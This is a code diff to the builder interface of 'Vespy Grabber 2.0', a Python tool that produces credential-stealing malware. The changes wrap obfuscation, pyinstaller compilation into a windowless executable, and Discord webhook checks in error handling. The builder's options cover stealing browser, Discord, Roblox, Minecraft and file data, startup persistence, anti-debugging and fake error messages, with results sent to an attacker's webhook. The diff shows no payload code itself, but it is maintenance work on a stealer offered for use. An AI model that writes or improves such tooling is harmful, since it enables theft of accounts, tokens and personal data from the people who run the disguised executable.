@@ -142,8 +142,11 @@ main()
 """)
         self.FILE.close()
         if obfuscateS:
-            embed.add_embed_field(name=f"Obfuscate : ", value=f":white_check_mark:")
-            self._Obfuscation(name)
+            try:
+                self._Obfuscation(name)
+                embed.add_embed_field(name=f"Obfuscate : ", value=f":white_check_mark:")
+            except:
+                embed.add_embed_field(name=f"Obfuscation Failed : ", value=f":white_check_mark:")
         else:
             embed.add_embed_field(name=f"Obfuscate : ", value=f":x:")
         self._Compile(icon = icon, name = name)
@@ -184,19 +187,22 @@ main()
             os.system(f"pyinstaller --onefile --name {name} --icon {icon} --noconsole --clean {name}.py")
         try:
             shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
+        except:pass
+        try:
             shutil.rmtree('build')
+        except:pass
+        try:
             shutil.rmtree('dist')
+        except:pass
+        try:
             shutil.rmtree('__pycache__')
+        except:pass
+        try:
             os.remove(f'{name}.spec')
+        except:pass
+        try:
             os.remove(f'{name}.py')
-        except:
-            try:
-                shutil.rmtree('build')
-                shutil.rmtree('dist')
-                shutil.rmtree('__pycache__')
-                os.remove(f'{name}.spec')
-            except:
-                pass
+        except:pass
 
 class Menu:
     
@@ -448,18 +454,21 @@ class Menu:
         if len(self.webhook.get()) < 5:
             messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Webhook too short idiot")
         else:
-            r=requests.get(self.webhook.get())
-            if r.status_code == 200 or r.status_code == 204:
-                webhook = self.webhook.get()
-                name = self.name.get().replace(" ","_").replace(".","_")
-                if name == "Name":
-                    name = "Default"
-                icon = self.icon.get()
-                if icon == "Icon Path" or icon == "":
-                    icon = ""
-                # :skull: ik
-                Builder(self.browserR,self.discordR,self.robloxR,self.filesR,self.minecraftR,self.networkI,self.obfuscateS,self.webhookJ,self.antiD,self.rebootP,self.startupP,self.errorM,self.pingH,self.discordS,webhook,name,icon)
-            else:
+            try:
+                r=requests.get(self.webhook.get())
+                if r.status_code == 200 or r.status_code == 204:
+                    webhook = self.webhook.get()
+                    name = self.name.get().replace(" ","_").replace(".","_")
+                    if name == "Name":
+                        name = "Default"
+                    icon = self.icon.get()
+                    if icon == "Icon Path" or icon == "":
+                        icon = ""
+                    # :skull: ik
+                    Builder(self.browserR,self.discordR,self.robloxR,self.filesR,self.minecraftR,self.networkI,self.obfuscateS,self.webhookJ,self.antiD,self.rebootP,self.startupP,self.errorM,self.pingH,self.discordS,webhook,name,icon)
+                else:
+                    messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")
+            except:
                 messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")
 
     def _compile(self):
